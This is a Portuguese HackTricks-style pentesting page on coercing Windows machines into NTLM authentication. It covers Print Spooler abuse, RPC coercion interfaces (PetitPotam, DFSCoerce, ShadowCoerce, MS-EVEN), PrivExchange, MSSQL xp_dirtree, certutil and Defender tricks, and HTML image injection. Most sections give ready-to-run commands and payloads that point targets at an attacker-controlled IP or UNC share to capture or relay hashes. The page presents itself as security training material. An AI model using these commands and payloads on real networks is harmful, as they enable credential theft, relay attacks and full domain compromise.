# Forçar Autenticação Privilegiada NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) é uma **coleção** de **gatilhos de autenticação remota** codificados em C# usando o compilador MIDL para evitar dependências de terceiros.

## Abuso do Serviço Spooler

Se o _**Print Spooler**_ service estiver **habilitado**, você pode usar algumas credenciais AD já conhecidas para **solicitar** ao servidor de impressão do Domain Controller uma **atualização** sobre novos trabalhos de impressão e simplesmente instruí‑lo a **enviar a notificação para algum sistema**.\
Observe que quando a impressora envia a notificação para um sistema arbitrário, ela precisa **autenticar‑se contra** esse **sistema**. Portanto, um atacante pode fazer com que o _**Print Spooler**_ service se autentique contra um sistema arbitrário, e o serviço **usará a conta do computador** nessa autenticação.

### Encontrando Servidores Windows no domínio

Usando o PowerShell, obtenha uma lista de máquinas Windows. Servidores geralmente têm prioridade, então vamos nos concentrar neles:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Encontrando serviços Spooler em escuta

Usando uma versão ligeiramente modificada do [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) do @mysmartlogin (Vincent Le Toux), verifique se o serviço Spooler está escutando:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Você também pode usar rpcdump.py no Linux e procurar pelo MS-RPRN Protocol
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Solicitar que o serviço autentique contra um host arbitrário

Você pode compilar [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ou use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se estiver no Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinando com Unconstrained Delegation

Se um atacante já comprometeu um computador com [Unconstrained Delegation](unconstrained-delegation.md), o atacante poderia **fazer a impressora autenticar-se contra este computador**. Devido ao unconstrained delegation, o **TGT** da **conta de computador da impressora** será **salvo na** **memória** do computador com unconstrained delegation. Como o atacante já comprometeu esse host, ele será capaz de **recuperar esse ticket** e abusar dele ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / PrintNightmare-family
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Opnum: 0 RpcAsyncOpenPrinter
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Note: These methods accept parameters that can carry a UNC path (e.g., `\\attacker\share`). When processed, Windows will authenticate (machine/user context) to that UNC, enabling NetNTLM capture or relay.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: o alvo tenta abrir o caminho de backup fornecido e se autentica no UNC controlado pelo atacante.
- Practical use: forçar ativos Tier 0 (DC/RODC/Citrix/etc.) a emitir NetNTLM, e então relays para endpoints AD CS (cenários ESC8/ESC11) ou outros serviços privilegiados.

## PrivExchange

O ataque `PrivExchange` é resultado de uma falha encontrada na **feature `PushSubscription` do Exchange Server**. Essa feature permite que o Exchange server seja forçado por qualquer usuário de domínio com uma mailbox a autenticar-se em qualquer host fornecido pelo cliente via HTTP.

Por padrão, o **serviço Exchange roda como SYSTEM** e recebe privilégios excessivos (especificamente, possui **WriteDacl privileges no domínio pré-Cumulative Update de 2019**). Essa falha pode ser explorada para permitir o **relaying de informações para LDAP e subsequentemente extrair o banco de dados NTDS do domínio**. Em casos onde relaying para LDAP não é possível, essa falha ainda pode ser usada para relatar e autenticar em outros hosts dentro do domínio. A exploração bem-sucedida desse ataque concede acesso imediato ao Domain Admin com qualquer conta de usuário de domínio autenticada.

## Inside Windows

Se você já está dentro da máquina Windows, você pode forçar o Windows a conectar-se a um servidor usando contas privilegiadas com:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ou use esta outra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

É possível usar certutil.exe lolbin (binário assinado pela Microsoft) para forçar autenticação NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Se você conhece o **email address** do usuário que faz login em uma máquina que você deseja comprometer, você poderia simplesmente enviar-lhe um **email with a 1x1 image** como
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
e quando ele abrir, tentará autenticar-se.

### MitM

Se você conseguir realizar um ataque MitM a um computador e injetar HTML em uma página que ele visualizar, pode tentar injetar uma imagem como a seguinte na página:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Other ways to force and phish NTLM authentication


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Se você puder capturar [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack).\
_Lembre-se de que, para crack NTLMv1, você precisa definir o Responder challenge para "1122334455667788"_

## Referências
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
